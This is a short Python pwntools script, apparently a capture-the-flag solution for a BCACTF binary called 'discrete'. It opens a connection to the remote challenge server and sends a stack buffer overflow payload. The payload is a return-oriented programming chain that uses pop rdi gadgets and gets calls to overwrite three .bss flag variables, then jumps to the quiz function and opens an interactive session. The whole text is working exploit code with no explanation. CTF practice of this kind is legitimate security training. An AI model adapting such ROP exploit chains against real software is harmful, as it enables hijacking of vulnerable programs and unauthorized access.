from pwn import *


r = remote("bin.bcactf.com",49160)
elf = ELF("./discrete")


address1 = p64(elf.symbols.logic)
address2 = p64(elf.symbols.algebra)
address3 = p64(elf.symbols.functions)
address4 = p64(elf.symbols.quiz)

address_bss_knows_logic = p64(0x4040ac)
address_bss_knows_algebra = p64(0x4040b0)
address_bss_knows_functions = p64(0x4040b4)
address_plt_gets = p64(0x401110)



POP_RDI_RET = p64(0x4017a3)
address_RET = p64(0x040101a)
PADDING = b'i will get an A\0' + b'A' * 56

payload = PADDING + POP_RDI_RET + address_bss_knows_logic + address_plt_gets + POP_RDI_RET + address_bss_knows_algebra + address_plt_gets + POP_RDI_RET + address_bss_knows_functions + address_plt_gets + address_RET + address4



r.sendline(payload)
for i in range(3):
    r.sendline(p64(1))
r.interactive()